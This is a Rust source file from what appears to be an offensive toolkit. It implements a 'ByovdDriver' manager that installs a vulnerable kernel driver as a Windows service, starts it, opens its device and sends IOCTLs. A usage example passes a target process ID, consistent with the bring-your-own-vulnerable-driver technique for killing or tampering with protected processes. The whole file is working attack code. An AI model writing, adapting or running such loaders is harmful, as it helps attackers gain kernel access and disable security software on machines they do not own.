use std::ptr::null_mut;

use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::{SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER};
use winapi::um::winsvc::{
    ControlService, CreateServiceW, DeleteService, OpenSCManagerW, OpenServiceW, StartServiceW,
    SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS,
};

use crate::device::DeviceHandle;
use crate::handle::ScHandle;
use crate::util::{get_current_dir, to_wstring};
use crate::Result;

/// Manages the SCM lifecycle of a vulnerable driver.
///
/// Modern usage:
/// ```ignore
/// let driver = ByovdDriver::new("MyDriver", "mydriver.sys", "\\\\.\\MyDevice")?;
/// driver.start()?;
/// let device = driver.open_device()?;
/// device.ioctl_in(0xDEAD, &target_pid)?;
/// driver.stop_and_delete()?;
/// ```
pub struct ByovdDriver {
    _sc_manager: ScHandle,
    service: ScHandle,
    device_path: Option<String>,
}

impl ByovdDriver {
    /// Modern constructor: stores `device_path` so `open_device()` works.
    /// Driver file is resolved next to the executable (current working directory).
    pub fn new(service_name: &str, driver_filename: &str, device_path: &str) -> Result<Self> {
        Self::install(service_name, driver_filename, Some(device_path), None)
    }

    /// General constructor with full control over device path and driver file location.
    ///
    /// - `service_name` — Windows service name to register
    /// - `driver_filename` — `.sys` filename, looked up next to the executable
    ///   unless `driver_path_override` provides an absolute path
    /// - `device_path` — `Some("\\\\.\\Device")` enables `open_device()`,
    ///   `None` keeps the manager device-less (back-compat with the old API)
    /// - `driver_path_override` — full path to the `.sys` file, overriding CWD
    pub fn install(
        service_name: &str,
        driver_filename: &str,
        device_path: Option<&str>,
        driver_path_override: Option<&str>,
    ) -> Result<Self> {
        println!("[*] Opening Service Control Manager");
        let sc_manager = ScHandle::new(unsafe {
            OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE)
        })
        .map_err(|_| "Failed to open Service Control Manager")?;

        let name_w = to_wstring(service_name);
        let raw_existing =
            unsafe { OpenServiceW(sc_manager.as_raw(), name_w.as_ptr(), SERVICE_ALL_ACCESS) };

        let service = if !raw_existing.is_null() {
            println!("[!] Service '{}' already exists", service_name);
            ScHandle::new(raw_existing)?
        } else {
            println!("[*] Creating service '{}'", service_name);
            let resolved_path = match driver_path_override {
                Some(p) => p.to_string(),
                None => format!("{}\\{}", get_current_dir()?, driver_filename),
            };
            println!("[*] Driver path: {}", resolved_path);

            ScHandle::new(unsafe {
                CreateServiceW(
                    sc_manager.as_raw(),
                    name_w.as_ptr(),
                    name_w.as_ptr(),
                    SERVICE_ALL_ACCESS,
                    SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START,
                    SERVICE_ERROR_NORMAL,
                    to_wstring(&resolved_path).as_ptr(),
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    null_mut(),
                )
            })
            .map_err(|_| "Failed to create service")?
        };

        Ok(Self {
            _sc_manager: sc_manager,
            service,
            device_path: device_path.map(|s| s.to_string()),
        })
    }

    /// Start the driver service. Treats `ERROR_SERVICE_ALREADY_RUNNING` as success.
    pub fn start(&self) -> Result<()> {
        println!("[*] Starting driver service");
        let result = unsafe { StartServiceW(self.service.as_raw(), 0, null_mut()) };

        if result == 0 {
            let err = unsafe { GetLastError() };
            // ERROR_SERVICE_ALREADY_RUNNING = 1056
            if err == 1056 {
                println!("[!] Driver already running");
                return Ok(());
            }
            return Err(format!("Failed to start service (error {})", err).into());
        }

        println!("[+] Driver started successfully");
        Ok(())
    }

    /// Stop the driver service and mark it for deletion.
    pub fn stop_and_delete(&self) -> Result<()> {
        println!("[*] Stopping driver service");
        let mut status: SERVICE_STATUS = unsafe { std::mem::zeroed() };
        unsafe {
            ControlService(self.service.as_raw(), SERVICE_CONTROL_STOP, &mut status);
            if DeleteService(self.service.as_raw()) != 0 {
                println!("[+] Service marked for deletion");
            } else {
                println!("[!] Failed to delete service (may require reboot)");
            }
        }
        Ok(())
    }

    /// Back-compat alias for `stop_and_delete()`.
    pub fn stop(&self) -> Result<()> {
        self.stop_and_delete()
    }

    /// Open the driver's device for IOCTL communication.
    /// Requires `device_path` provided at construction.
    pub fn open_device(&self) -> Result<DeviceHandle> {
        let path = self
            .device_path
            .as_deref()
            .ok_or("device_path not set; construct with ByovdDriver::new() to enable open_device()")?;
        DeviceHandle::open(path)
    }
}
